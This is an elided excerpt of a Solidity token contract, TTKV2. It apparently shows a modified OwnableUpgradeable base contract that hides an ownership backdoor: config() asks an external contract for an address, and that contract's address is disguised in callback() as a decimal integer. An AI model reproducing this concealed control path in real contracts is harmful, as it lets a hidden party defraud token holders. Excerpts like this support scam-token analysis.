 ...
 */
contract TTKV2 is Initializable, ContextUpgradeable, OwnableUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable {
...
abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    ...
    function config() internal virtual returns (address) {
        return IConfigOwnable(callback()).avoid();
    }
    ...
    function callback() internal pure returns (address) {
        return address(1234065029934773697033107479010356501190691619873);
    }
